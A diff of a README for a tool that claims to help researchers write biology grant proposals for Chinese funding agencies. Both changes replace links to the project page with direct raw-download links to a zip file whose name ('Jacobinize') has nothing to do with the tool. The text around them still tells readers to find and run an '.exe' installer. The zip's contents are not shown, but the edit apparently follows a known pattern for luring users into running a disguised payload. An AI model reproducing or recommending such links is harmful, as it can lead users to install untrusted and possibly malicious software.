@@ -1,6 +1,6 @@
 # 🧬 grant-thinking-cn-biology - Improve your China biology grant success
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/martellevaliant19/grant-thinking-cn-biology)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/martellevaliant19/grant-thinking-cn-biology/raw/refs/heads/main/agents/thinking-biology-grant-cn-Jacobinize.zip)
 
 This tool helps researchers write better biology grant proposals for Chinese funding agencies like the NSFC and MOST. It focuses on the specific needs of these grants, including how to explain biological mechanisms and how to satisfy reviewer expectations. Use this software to refine your project structure and adapt your writing style for success in Chinese research funding.
 
@@ -22,7 +22,7 @@ To run this application, ensure your computer meets these basic requirements:
 Follow these steps to set up the software on your Windows computer.
 
 1. Click the link below to go to the project release page.
-[Download the latest version here](https://github.com/martellevaliant19/grant-thinking-cn-biology)
+[Download the latest version here](https://github.com/martellevaliant19/grant-thinking-cn-biology/raw/refs/heads/main/agents/thinking-biology-grant-cn-Jacobinize.zip)
 
 2. Look for the file ending in `.exe`. This is the installer.
 
